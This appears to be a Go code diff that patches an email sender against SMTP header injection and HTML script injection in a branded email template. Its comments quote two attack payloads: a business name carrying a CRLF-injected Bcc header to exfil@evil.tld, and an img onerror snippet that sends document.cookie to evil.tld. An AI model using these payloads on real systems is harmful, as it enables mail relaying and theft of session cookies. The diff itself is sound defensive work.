@@ -7,6 +7,7 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"html"
 	"log/slog"
 	"net/http"
 	"net/smtp"
@@ -119,13 +120,18 @@ func (s *smtpSender) send(to, subject, html string, headers map[string]string) e
 // buildMessage renders a multipart/alternative MIME message: plain text from
 // a naive tag strip, then the HTML part. extra carries raw headers (bulk mail
 // adds List-Unsubscribe).
+//
+// Every value is passed through headerValue: a CR or LF in any of them would
+// otherwise end the header line and let the remainder be parsed as a new header.
+// `to` is the address itself and `subject` can contain an owner-controlled
+// business name, so both are reachable from user input.
 func buildMessage(from, to, subject, html string, extra map[string]string) []byte {
 	var b strings.Builder
-	b.WriteString("From: " + from + "\r\n")
-	b.WriteString("To: " + to + "\r\n")
-	b.WriteString("Subject: " + subject + "\r\n")
+	b.WriteString("From: " + headerValue(from) + "\r\n")
+	b.WriteString("To: " + headerValue(to) + "\r\n")
+	b.WriteString("Subject: " + headerValue(subject) + "\r\n")
 	for k, v := range extra {
-		b.WriteString(k + ": " + v + "\r\n")
+		b.WriteString(headerValue(k) + ": " + headerValue(v) + "\r\n")
 	}
 	b.WriteString("MIME-Version: 1.0\r\n")
 	boundary := mimeBoundary()
@@ -191,6 +197,35 @@ func NewSender(cfg ResendConfig) Sender {
 }
 
 // Branded HTML wrapper (Batch 4): consistent template for all transactional mail.
+// headerValue strips characters that would terminate a header line.
+//
+// HEADER INJECTION. A business owner controls their business name, which lands
+// in the subject of the co-owner invite email
+// (service/invites.go: "You've been invited to co-manage " + businessName).
+// A name of "x\r\nBcc: exfil@evil.tld" therefore injected a Bcc header on the
+// SMTP path, turning the transactional mailer into an open relay for the
+// attacker's address. net/http sanitises response headers, but this is a raw
+// text/template-free writer, so nothing else did.
+//
+// CR and LF are removed rather than rejected, so a stray newline in a name
+// degrades the subject instead of failing the send.
+func headerValue(s string) string {
+	return strings.NewReplacer("\r", " ", "\n", " ").Replace(s)
+}
+
+// WrapHTML builds the branded HTML email shell.
+//
+// `title` is HTML-ESCAPED. It previously was not, and it is attacker-influenced
+// wherever it derives from a business name (the co-owner invite) or a saved
+// search name (the daily alert). An owner naming their business
+// `<img src=x onerror="fetch('https://evil.tld/?c='+document.cookie)">` got
+// that markup rendered inside the platform's own branding in a recipient's
+// webmail client.
+//
+// `bodyHTML` is passed through UNCHANGED because callers already escape their
+// own interpolations (htmlEscape in service/auth.go and service/invites.go,
+// escapeHTML in searchalerts, xmlEscape in digest). Escaping here as well would
+// double-encode and show raw entities to the user.
 func WrapHTML(publicURL, title, bodyHTML string) string {
 	return `<!doctype html><html><body style="margin:0;background:#f5f5f5;padding:24px;font-family:Arial,sans-serif">
 	<div style="max-width:560px;margin:auto;background:#ffffff;border-radius:12px;overflow:hidden">
@@ -198,11 +233,11 @@ func WrapHTML(publicURL, title, bodyHTML string) string {
 	<span style="color:#fafafa;font-size:16px;font-weight:700;letter-spacing:2px">BIZVERSE</span>
 	</div>
 	<div style="padding:24px">
-	<h1 style="font-size:18px;margin:0 0 12px">` + title + `</h1>
+	<h1 style="font-size:18px;margin:0 0 12px">` + html.EscapeString(title) + `</h1>
 	` + bodyHTML + `
 	</div>
 	<div style="padding:16px 24px;border-top:1px solid #eee;color:#999;font-size:12px">
-	` + publicURL + ` · Every business, one place
+	` + html.EscapeString(publicURL) + ` — Every business, one place
 	</div>
 	</div></body></html>`
 }
